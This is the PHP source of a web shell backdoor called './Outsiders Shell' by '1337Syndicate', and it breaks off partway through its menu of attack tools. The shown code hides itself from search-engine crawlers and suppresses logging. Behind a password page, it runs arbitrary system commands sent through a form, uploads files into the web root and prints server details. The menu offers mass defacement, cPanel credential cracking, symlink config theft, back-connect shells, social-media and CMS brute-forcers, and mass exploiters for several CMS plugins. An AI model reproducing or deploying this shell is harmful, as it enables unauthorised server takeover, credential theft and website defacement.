<?php
#####################################
##   ./Outsiders                                                                   ##
##   Recoded By ./Outsiders			                                      ##
##   bangpen1337@protonmail.com                          ##
##   4ever only email :)			     	                        ##
##   Security? that just an illucions                         ##
##   1337Syndicate          		                                 ##
#####################################
session_start();
error_reporting(0);
set_time_limit(0);
if(version_compare(PHP_VERSION, '5.3.0', '<')) {
	@set_magic_quotes_runtime(0);
}
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
$color = "#00ff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

function login_shellbackdoor() {
?>
<html>
<head>
	<link rel="SHORTCUT ICON" href="https://a.top4top.io/p_2317jl8lf0.jpg">
<title>#  ./Outsiders Shell  #</title>
<style type="text/css">
html {
	background: #000000;
	color: green;
}
header {
	color: green;
	margin: 10px auto;
}
input[type=password] {
	width: 250px;
	height: 25px;
	color: red;
	background: #000000;
	border: 1px solid #ffffff;
	padding: 5px;
	margin-left: 20px;
	text-align: center;
	transition: box-shadow 0.4s ease-out, border 0.4s ease-out;
	-webkit-transition: box-shadow 0.4s ease-out, border 0.4s ease-out;
	-moz-transition: box-shadow 0.4s ease-out, border 0.4s ease-out;
	-ms-transition: box-shadow 0.4s ease-out, border 0.4s ease-out;
}
input[type=password]:focus {
	box-shadow: 0px 0px 5px #cc0000, 0px 0px 15px #ff0000, 0px 0px 25px #ff0000, 0px 0px 35px #cc0000;
	border: 1px solid #ff0000;
}
</style>
</head>
<header>

<center>
<style type="text/css">
			#info-teja {
			z-index: 1000;
			background:-moz-linear-gradient(top,  #1F2326,  #555);
			background: -webkit-gradient(linear, left top, left bottom, from(#1F2326), to(#555));
			box-shadow:-2px -2px 8px #202020, 2px 2px 20px #202020;-moz-box-shadow:-2px -2px 8px #202020, 2px 2px 20px #202020;
		    -webkit-box-shadow:-2px -2px 8px #202020, 2px 2px 20px #202020;
			width:460px;
			position: fixed;
			top:150px;
			left:0;
			margin-left:-350px;
			border:1px solid #444;
			background-position:top right no-repeat;
			height:35px;font:11px Orbitron;
			color:#eee;
			border-top-right-radius:8px;
			border-bottom-right-radius:8px;
		    -moz-border-radius-topright:8px;
		    -moz-border-radius-bottomright:8px;
			-webkit-border-top-right-radius:8px;
			-webkit-border-bottom-right-radius:8px;
		}
	#info-teja{
	-o-transition: all 1s ease-in;
    -moz-transition: all 1s ease-in;
    -webkit-transition: all 1s ease-in;
	} 
	#info-teja:hover{
	width:400px;
	opacity:1.0;
	margin-left:0;
	}
	.Tejainbox {
	border:1px solid #444;
	width:320px; 
	margin:0px 90px 10px 10px;
	background:#000;
	color:#ffffff; 
	border-radius :20px; 
	padding:5px 0;
    -moz-border-radius:20px; 
    -webkit-border-radius:20px;
    -o-transition:all 2s ease-in;
    -moz-transition:all 2s ease-in;
    -webkit-transition:all 2s ease-in;
    opacity:0.2;
	}
	.Tejainbox:hover{
	opacity:1.0;
	box-shadow:1px 1px 15px #000; 
    -moz-box-shadow: 1px 1px 15px #000;
    -webkit-box-shadow: 1px 1px 15px #000;
	background: #000;
	}
	.Tejainbox2 {
	margin:5px 10px;
	padding:0px 8px 10px;
	color:#FFFFFF;
	overflow:hidden;
	height:370px;
	}
	.teja15 {
	border-radius:15px;
    -moz-border-radius:15px;
	-webkit-border-radius:15px;
	}
	.Teja2 ul.bom {
	margin: 0; 
	padding: 0;
	}
	.Tejainbox2 li {
	margin-left:20px;
	}
	.Tejainbox2 li a {
	color: #FFFFF; 
	line-height: 4px; 
	font-size: 11px;
	font-weight: bold;
	text-decoration:none;
	}
	.Tejainbox2 li a:hover {
	color: #428bca;
	text-shadow: 0 1px 1px #000;
	}
	.Tejainbox2 h2 { 
	font: 18px Droid Serif;
	font-weight:bold;
	padding:0 8px;
	color: #fffff;
	text-shadow: 0px 1px 1px #ddd;
	border-bottom: 1px solid #202020;
	}
	.Tejatouch {
	font-size:21px;
	font-weight:bold;
	font-family:Arial Narrow;
	float:right;
	margin: 3px 10px 0 0;
    -o-transition: all 0.5s ease-out;
    -moz-transition: all 0.5s ease-out;
    -webkit-transition: all 0.5s ease-out;
 	text-decoration:blink;
 	}
 .Tejatouch:hover{
    -o-transform: scale(2) rotate(720deg) translate(0px);
    -moz-transform: scale(2) rotate(720deg) translate(0px);
    -webkit-transform: scale(2) rotate(720deg) translate(0px);
    color: #fffff;
	}</style>	
<pre>
<script type="text/javascript">
TypingText = function(element, interval, cursor, finishedCallback) {
  if((typeof document.getElementById == "undefined") || (typeof element.innerHTML == "undefined")) {
    this.running = true;	// Never run.
    return;
  }
  this.element = element;
  this.finishedCallback = (finishedCallback ? finishedCallback : function() { return; });
  this.interval = (typeof interval == "undefined" ? 100 : interval);
  this.origText = this.element.innerHTML;
  this.unparsedOrigText = this.origText;
  this.cursor = (cursor ? cursor : "");
  this.currentText = "";
  this.currentChar = 0;
  this.element.typingText = this;
  if(this.element.id == "") this.element.id = "typingtext" + TypingText.currentIndex++;
  TypingText.all.push(this);
  this.running = false;
  this.inTag = false;
  this.tagBuffer = "";
  this.inHTMLEntity = false;
  this.HTMLEntityBuffer = "";
}
TypingText.all = new Array();
TypingText.currentIndex = 0;
TypingText.runAll = function() {
  for(var i = 0; i < TypingText.all.length; i++) TypingText.all[i].run();
}
TypingText.prototype.run = function() {
  if(this.running) return;
  if(typeof this.origText == "undefined") {
    setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);	// We haven't finished loading yet.  Have patience.
    return;
  }
  if(this.currentText == "") this.element.innerHTML = "";
//  this.origText = this.origText.replace(/<([^<])*>/, "");     // Strip HTML from text.
  if(this.currentChar < this.origText.length) {
    if(this.origText.charAt(this.currentChar) == "<" && !this.inTag) {
      this.tagBuffer = "<";
      this.inTag = true;
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == ">" && this.inTag) {
      this.tagBuffer += ">";
      this.inTag = false;
      this.currentText += this.tagBuffer;
      this.currentChar++;
      this.run();
      return;
    } else if(this.inTag) {
      this.tagBuffer += this.origText.charAt(this.currentChar);
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == "&" && !this.inHTMLEntity) {
      this.HTMLEntityBuffer = "&";
      this.inHTMLEntity = true;
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == ";" && this.inHTMLEntity) {
      this.HTMLEntityBuffer += ";";
      this.inHTMLEntity = false;
      this.currentText += this.HTMLEntityBuffer;
      this.currentChar++;
      this.run();
      return;
    } else if(this.inHTMLEntity) {
      this.HTMLEntityBuffer += this.origText.charAt(this.currentChar);
      this.currentChar++;
      this.run();
      return;
    } else {
      this.currentText += this.origText.charAt(this.currentChar);
    }
    this.element.innerHTML = this.currentText;
    this.element.innerHTML += (this.currentChar < this.origText.length - 1 ? (typeof this.cursor == "function" ? this.cursor(this.currentText) : this.cursor) : "");
    this.currentChar++;
    setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);
  } else {
	this.currentText = "";
	this.currentChar = 0;
        this.running = false;
        this.finishedCallback();
  }
}
</script>
</pre>
<div id="info-teja"><span class="Tejatouch" style="font-family:orbitron;font-size:18px">Credits:</span><div class="Tejainbox"><div class="Tejainbox2 teja15">
<h2><center> [+] We Are [+] </h2><br>
 
<center><div id="contenttengah"><center>
		<img title="1337Syndicate"src="https://a.top4top.io/p_2317jl8lf0.jpg" width="70%"></div> </center>


<span class="style4">Shell Programmer: <br>./Outsiders</span><br><br>
<span class="style4">./Outsiders: <br>1337Syndicate</span><br><br>
<span class="style4">Official Member: <br>./Outsiders - XylaufyyaId - RadarXploit </span><br><br>
<span class="style4">Greetz : <br> 1337Syndicate </span>
</div></div></div></td>
</div>

<?php 

$ServerName = $_SERVER['SERVER_NAME'];

?>
<style>
@import url(http://fonts.googleapis.com/css?family=Iceland);
</style>
<font color = "red" face = "Iceland" size = "6">1337Syndicate Bypass</font><br><br><br>
<font style="font: 15pt Verdana; color: red;">Welcome Hackers!!</font><br><br>
<table align="center" border="1" width="600" heigh>
<tbody><tr>
<td valign="top" background="http://dl.dropbox.com/u/10860051/images/matran."><p id="hack" style="margin-left: 3px;">
<font color="lime"> Please Wait . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font> <br>
<font color="#FFF000"> Searching For Available Users . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font><br>
<font color="#FFF000"> Users Found : <font color = 'red'>root@rixxx:~$ . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font></font><br>
<font color="lime"> Connecting To Our Master ^_^  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font><br>
<font color="#F00000"><font color="#FFF000">root@outsiders:~$</font> Connected ! </font><br>
<font color="lime"> Detecting The Server . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font><br>
<font color="lime"> Server Detected <font color="#FFF000"><?php echo $ServerName.": ~$" ?></font> . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font><br>
<font color="lime"> Trying To Connect To The Server . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font><br>
<font color="#F00000"><font color="#FFF000"><?php echo $ServerName.": ~$" ?></font> Connected ! </font><br>
<font color="#009900"><font color="#FFF000"><?php echo $ServerName.": ~$" ?></font><font color="lime"> Checking Server Command . . . . . . . . . . . . . . . . . . .</font> <br>

<font color="#009900"><font color="#FFF000"><?php echo $ServerName.": ~$" ?></font><font color="lime"> Trying connect to Command . . . . . . . . . . .</font><br>

<font color="#F00000"><font color="#FFF000"><?php echo $ServerName.": ~$" ?></font> Connected Command! </font><br>
<font color="red">root@outsiders:~$ </font><font color="#FFF000"><?php echo "@". $ServerName ?><br></font><font color="red">Ready To Fuck Server :v</font>
</tr>
</tbody></table>
<br>

<script type="text/javascript">
new TypingText(document.getElementById("hack"), 30, function(i){ var ar = new Array("_",""); return " " + ar[i.length % ar.length]; });
TypingText.runAll();

</script>


</pre>	

</center>
</header>
<form method="post">
<center><input type="password" name="pass"><center>
</form><br><br>
<font color = "red" face = "Verdana">Visit Us! : coming soon >_< </font>
<audio controls autoplay hidden>
				<source src="https://a.tumblr.com/tumblr_nc451eJAWg1tjcth4o1.mp3" type="audio/mpeg">
			</audio><br><br>
<font color = "red" face = "Verdana">©2020 - 1337Syndicate </font> 			
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shellbackdoor();
?>
<html>
<head>
	<link rel="SHORTCUT ICON" href="https://k.top4top.io/p_22061rtwm7.png">
<title>#  ./Outsiders Shell - Priv8  #</title>
<meta name='author' content='./Outsiders'>
<meta charset="UTF-8">
<style type='text/css'>
@import url(http://fonts.googleapis.com/css?family=Iceland);
@import url("https://fonts.googleapis.com/css?family=Rajdhani");
@import url(http://fonts.googleapis.com/css?family=Share+Tech+Mono);
hr {
 border:0;
 height:1px;
 background-image:linear-gradient(to right,rgba(0,0,0,0),rgb(255, 0, 0),rgba(0,0,0,0))
 }
html {
    background: #000000;
    color: #ffffff;
    font-family: 'Share Tech Mono';
	font-size: 13px;
	width: 100%;
}
li {
	display: inline;
	margin: 1px;
	padding: 1px;
}

 #menu a {
				padding:2px 10px;  
				margin:0; 
				background:#222222; 
				text-decoration:none; 
				letter-spacing:2px; 
				padding: 2px 10px;
				margin: 0;
				background: #222222;
				text-decoration: none;
				letter-spacing: 2px;
				border-radius: 2px;
				border-bottom: 2px solid #e11a1a;
				border-top: 2px solid #e11a1a;
				border-right: 2px solid #e11a1a;
				border-left: 2px solid #e11a1a;
       }
       #menu a:hover {
			background:#180000; 
			border-bottom:0px solid #333333; 
			border-top:0px solid #333333; 
       }
table tr:first-child{	
	background: black;
	text-align: center;
	color: red;
}
table, th, td {
	border-collapse:collapse;
	font-family: Tahoma, Geneva, sans-serif;
	background: transparent;
	font-family: 'Share Tech Mono';
	font-size: 13px;
}
.table_home, .th_home, .td_home {
	border: 0px solid red;
}
th {
	padding: 10px;
}
a {
	color: #ffffff;
	text-decoration: none;
}
a:hover {
	color: red;
	text-decoration: underline;
}
b {
	color: red;
}
input[type=text], input[type=password],input[type=submit] {
	background: transparent; 
	color: #ffffff; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Share Tech Mono';
	font-size: 13px;
}
input[type=submit] {
	background: transparent; 
	color: #ffffff; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Share Tech Mono';
	font-size: 13px;
	cursor:pointer;
}
textarea {
	border: 1px solid #ffffff;
	width: 100%;
	height: 400px;
	padding-left: 5px;
	margin: 10px auto;
	resize: none;
	background: transparent;
	color: #ffffff;
	font-family: 'Share Tech Mono';
	font-size: 13px;
}
select {
	width: 152px;
	background: #000000; 
	color: red; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Share Tech Mono';
	font-size: 13px;
}
option:hover {
	background: red;
	color: #000000;
}
.mybox{-moz-border-radius: 10px; border-radius: 10px;border:1px solid #ff0000; padding:4px 2px;width:70%;line-height:24px;background:none;box-shadow: 0px 4px 2px white;-webkit-box-shadow: 0px 4px 2px #ff0000;-moz-box-shadow: 0px 4px 2px #ff0000;}
.cgx2 {text-align: center;letter-spacing:1px;font-family: "orbitron";color: #ff0000;font-size:25px;text-shadow: 5px 5px 5px black;}
.infoweb {
	border-right: 1px solid #00FFFF;
}

</style>
<style type="text/css">
@-webkit-keyframes spinner {
  from {-webkit-transform: rotateY(0deg);}
  to {-webkit-transform: rotateY(-360deg);}
}

@-ms-keyframes spinner {
  from {-ms-transform: rotateY(0deg);}
  to {-ms-transform: rotateY(-360deg);}
}

@-o-keyframes spinner {
  from {-o-transform: rotateY(0deg);}
  to {-o-transform: rotateY(-360deg);}
}

@keyframes spinner {
  from {transform: rotateY(0deg);}
  to {transform: rotateY(-360deg);}
}

@-moz-keyframes spinner {
  from {-moz-transform: rotateY(0deg);}
  to {-moz-transform: rotateY(-360deg);}
}

#stage {
  margin: 1em auto;
  -webkit-perspective: 1200px;
  -moz-perspective: 1200px;
  -ms-perspective: 1200px;
  perspective: 1200px;
}
#spinner, #spinner p {
  text-align: center;
  color: #fff;
  -webkit-animation-name: spinner;
  -webkit-animation-timing-function: linear;
  -webkit-animation-iteration-count: infinite;
  -webkit-animation-duration: 6s;

  -moz-animation-name: spinner;
  -moz-animation-timing-function: linear;
  -moz-animation-iteration-count: infinite;
  -moz-animation-duration: 6s;

  animation-name: spinner;
  animation-timing-function: linear;
  animation-iteration-count: infinite;
  animation-duration: 6s;

  -webkit-transform-style: preserve-3d;
  -moz-transform-style: preserve-3d;
  -ms-transform-style: preserve-3d;
  transform-style: preserve-3d;
}
#spinner:hover {
  -webkit-animation-play-state: paused;
  -moz-animation-play-state: paused;
  animation-play-state: paused;
}
.tabnet{
	margin:15px auto 0 auto;
	border: 1px solid #333333;
}
.inputz{
	background:#111111;
	border:0;
	padding:2px;
	border-bottom:1px solid #222222;
	border-top:1px solid #222222;
}
.inputzbut{
	background:#111111;
	color:white;
	margin:0 4px;
	border:1px solid #444444;

}
.inputz:hover
	border-bottom:1px solid aqua;
	border-top:1px solid aqua;
	
}
.inputzbut:hover{
	border-bottom:1px solid aqua;
	border-top:1px solid aqua;
}
</style>
</head>
<?php

function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function r($dir,$perm) {
	if(!is_readable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
function perms($file){
	$perms = fileperms($file);
	if (($perms & 0xC000) == 0xC000) {
	// Socket
	$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
	// Symbolic Link
	$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
	// Regular
	$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
	// Block special
	$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
	// Directory
	$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
	// Character special
	$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
	// FIFO pipe
	$info = 'p';
	} else {
	// Unknown
	$info = 'u';
	}
		// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}
if(strtolower(substr($system,0,3)) == "win") $win = TRUE;
else $win = FALSE; 
// change directory
if(isset($_GET['y'])){
	if(@is_dir($_GET['view'])){
		$pwd = $_GET['view'];
		@chdir($pwd);
	}
	else{
		$pwd = $_GET['y'];
		@chdir($pwd);
	}
}

function hdd($s) {
	if($s >= 1073741824)
	return sprintf('%1.2f',$s / 1073741824 ).' GB';
	elseif($s >= 1048576)
	return sprintf('%1.2f',$s / 1048576 ) .' MB';
	elseif($s >= 1024)
	return sprintf('%1.2f',$s / 1024 ) .' KB';
	else
	return $s .' B';
}

function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
if(get_magic_quotes_gpc()) {
	function idx_ss($array) {
		return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
	}
	$_POST = idx_ss($_POST);
}

error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
if(version_compare(PHP_VERSION, '5.3.0', '<')) {
	@set_magic_quotes_runtime(0);
}
if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$freespace = hdd(disk_free_space("/"));
$total = hdd(disk_total_space("/"));
$used = $total - $freespace;
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=lime>OFF</font>";
$ds = @ini_get("disable_functions");
$open_basedir = @ini_get("Open_Basedir");
$safemode_exec_dir = @ini_get("safe_mode_exec_dir");
$safemode_include_dir = @ini_get("safe_mode_include_dir");

$mysql = (function_exists('mysql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$mssql = (function_exists('mssql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$pgsql = (function_exists('pg_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$magicquotes = (function_exists('get_magic_quotes_gpc')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$ssh2 = (function_exists('ssh2_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$oracle = (function_exists('oci_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>All Functions Is Accessible </font>";
$show_obdir = (!empty($open_basedir)) ? "<font color=red>OFF</font>" : "<font color=lime>ON</font>";
$show_exec = (!empty($safemode_exec_dir)) ? "<font color=red>OFF</font>" : "<font color=lime>ON</font>";
$show_include = (!empty($safemode_include_dir)) ? "<font color=red>OFF</font>" : "<font color=lime>ON</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
echo "<center>";
echo "<br>";
echo "<img src = 'hhttps://a.top4top.io/p_2317jl8lf0.jpg' width = '110' height = '110' id='spinner'></img>";
echo "&emsp;&emsp;&emsp;";
echo "<font size='20px' color='red' face = 'Rajdhani'>#  ./Outsiders Shell - Priv8  #</font>";
echo "&emsp;";
echo "<img src = 'https://a.top4top.io/p_2317jl8lf0.jpg' width = '100' height = '100' id='spinner'></img>";
echo "<br><br>";
if($_POST['upload']) {
		if($_POST['tipe_upload'] == 'biasa') {
			if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
				$act = "<font color=lime>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
			} else {
				$act = "<font color=red>failed to upload file</font>";
			}
		} else {
			$root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['ix_file']['name'];
			$web = $_SERVER['HTTP_HOST']."/".$_FILES['ix_file']['name'];
			if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
				if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
					$act = "<font color=lime>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
				} else {
					$act = "<font color=red>failed to upload file</font>";
				}
			} else {
				$act = "<font color=red>failed to upload file</font>";
			}
		}
	}
	echo "
	<form method='post' enctype='multipart/form-data'>
	<input type='radio' name='tipe_upload' value='biasa' checked>Biasa [ ".w($dir,"Writeable")." ] 
	<input type='radio' name='tipe_upload' value='home_root'>home_root [ ".w($_SERVER['DOCUMENT_ROOT'],"Writeable")." ]<br>
	<input type='file' name='ix_file'>
	<input type='submit' value='upload' name='upload'>
	</form>";
	echo $act;
echo "<hr color='red'></font></center>";
echo "<pre>";
echo "Server IP 		: <font color = 'red'>".$_SERVER['SERVER_ADDR']. "</font> Your IP :<font color ='red'> ".$_SERVER['REMOTE_ADDR']."</font><br>";
echo "Software 		: <font color = 'lime'>".$_SERVER['SERVER_SOFTWARE']."</font><br>";
echo "Kernel Version 		: <font color = 'lime'>".php_uname()."</font><br>";
echo "Storage Space 		: <font color=lime>$used</font> / <font color=lime>$total</font> ( Free: <font color=lime>$freespace</font> )<br>";
echo "User / Group 		: <font color = 'lime'>".$user." (".$uid.") | ".$group." (".$gid.")</font><br>";
echo "Time On Server 		: <font color = 'lime'>".date("d M Y h:i:s a"). "</font><br>";
echo "Disable Functions 	: $show_ds<br>";
echo "Safe Mode 		: $sm<br>";
echo "PHP Version 		: <font color = 'lime'>".phpversion()." On ".php_sapi_name()."</font><br><br>";
echo "Open_Basedir: $show_obdir | Safe Mode Exec Dir: $show_exec | Safe Mode Include Dir: $show_include |  <br>";
echo "MySQL: $mysql | MSSQL: $mssql | PostgreSQL: $pgsql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl | Magic Quotes: $magicquotes | SSH2: $ssh2 | Oracle: $oracle |  <br>";

echo "</pre>";
echo "<form method='post'>
	<font color = 'red'>".$user."@".gethostbyname($_SERVER['HTTP_HOST']).": ~ $ </font>&nbsp;
	<input style='border: none; border-bottom: 1px solid #ffffff;' type='text' size='30' height='10' name='cmd'><input style='border: none; border-bottom: 1px solid #ffffff;' type='submit' name='do_cmd' value='>>'>
	</form>";
	if($_POST['do_cmd']) {
		echo "<pre>".exe($_POST['cmd'])."</pre>";
	}		
echo "</td></table>";
echo "<div id='menu'>";
echo "<hr color='red'>";
echo "<center>";
echo "<ul>";
echo "<li><a href='?' style = 'color:red';>Home</a></li>";
echo "<li> <a href='?dir=$dir&do=mass_deface'>Mass Tools</a> </li>";
echo "<li> <a href='?dir=$dir&do=config'>Config</a> </li>";
echo "<li> <a href='?dir=$dir&do=configv2'>Config V.2</a> </li>";
echo "<li> <a href='?dir=$dir&do=symlink'>Symlink</a></li>";
echo "<li> <a href='?dir=$dir&do=symlink2'>Symlink V.2</a> </li>";
echo "<li> <a href='?dir=$dir&do=symlink_python'>Symlink Python</a> </li>";
echo "<li> <a href='?dir=$dir&do=symconfig'>SymConfig</a> </li>";
echo "<li> <a href='?dir=$dir&do=adminer'>Adminer</a> </li> ";
echo "<li> <a href='?dir=$dir&do=grabcpanel'>Grab Cpanel</a> </li>";
echo "<li> <a href='?dir=$dir&do=cpanel'>CPanel Crack</a> </li><br><br>";
echo "<li> <a href='?dir=$dir&do=zoneh'>Zone-H</a> </li>";
echo "<li> <a href='?dir=$dir&do=defacerid'>Defacer.id</a> </li>";
echo "<li> <a href='?dir=$dir&do=multiconfig'>Multi Config</a> </li>";
echo "<li> <a href='?dir=$dir&do=cgi'>CGI Perl</a> </li>";
echo "<li> <a href='?dir=$dir&do=cgi2'>CGI Perl 2</a> </li>";
echo "<li> <a href='?dir=$dir&do=cgipy'>CGI Python</a> </li>";
echo "<li> <a href='?dir=$dir&do=network'>Back Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=backconnect'>Back Connect V.2</a> </li>";
echo "<li> <a href='?dir=$dir&do=jumping'>Jumping</a> </li>";
echo "<li> <a href='?dir=$dir&do=fake_root'>Fake Root</a> </li><br><br>";
echo "<li> <a href='?dir=$dir&do=auto_dwp'>Wp Auto Deface</a> </li>";
echo "<li> <a href='?dir=$dir&do=auto_dwp2'>Wp Auto Deface V.2</a> </li>";
echo "<li> <a href='?dir=$dir&do=auto_wp'>Wp Auto Edit Title</a> </li>";
echo "<li> <a href='?dir=$dir&do=hijack_wp'>Wp Auto Hijack</a> </li>";
echo "<li> <a href='?dir=$dir&do=jodexer'>Joomla Auto Deface</a></li>";
echo "<li> <a href='?dir=$dir&do=cpftp_auto'>Cpanel/Ftp Auto Deface</a></li>";
echo "<li> <a href='?dir=$dir&do=whois'>Whois</a></li><br><br>";
echo "<li> <a href='?dir=$dir&do=csrfup'>Csrf Exploiter</a></li>";
echo "<li> <a href='?dir=$dir&do=revslider'>RevSlider Mass Exploiter</a></li>";
echo "<li> <a href='?dir=$dir&do=elfinder'>Elfinder Mass Exploiter</a></li>";
echo "<li> <a href='?dir=$dir&do=lokomedia'>Lokomedia Mass Exploiter</a></li>";
echo "<li> <a href='?dir=$dir&do=drupal'>Drupal Mass Exploiter</a></li><br><br>";
echo "<li> <a href='?dir=$dir&do=ngindexx'>NginDexer</a> </li>";
echo "<li> <a href='?dir=$dir&do=vb'>VB Index Changer</a> </li>";
echo "<li> <a href='?dir=$dir&do=krdp_shell'>K-RDP Shell</a> </li>";
echo "<li> <a href='?dir=$dir&do=netsploit'>NetSploit</a> </li>";
echo "<li> <a href='?dir=$dir&do=smtp'>SMTP Grabber</a> </li>";
echo "<li> <a href='?dir=$dir&do=whmcsdecod'>WHMCS Decoder</a></li>";
echo "<li> <a href='?dir=$dir&do=dbdump'>DB Dump</a> </li>";
echo "<li> <a href='?dir=$dir&do=code'>Inject Code</a> </li><br><br>";
echo "<li> <a href='?dir=$dir&do=jbrute'>BruteForce Joomla</a></li>";
echo "<li> <a href='?dir=$dir&do=wpbrute'>BruteForce Wordpress</a></li>";
echo "<li> <a href='?dir=$dir&do=fb'>BruteForce Facebook</a></li>";
echo "<li> <a href='?dir=$dir&do=emailbrute'>BruteForce Email</a></li>";
echo "<li> <a href='?dir=$dir&do=twitterbf'>BruteForce Twitter</a></li><br><br>";
echo "<li> <a href='?dir=$dir&do=auto_edit_user'>Mass User Changer</a> </li>";
echo "<li> <a href='?dir=$dir&do=title'>Mass Title Changer</a> </li>";
echo "<li> <a href='?dir=$dir&do=sqli-scanner'>SQLi Scanner</a></li>";
echo "<li> <a href='?dir=$dir&do=ports'>Port Scanner</a></li>";
echo "<li> <a href='?dir=$dir&do=cmsvuln'>CMS Vulnerability Scanner</a></li><br><br>";
echo "<li> <a href='?dir=$dir&do=string'>Encode/Decode</a> </li>";
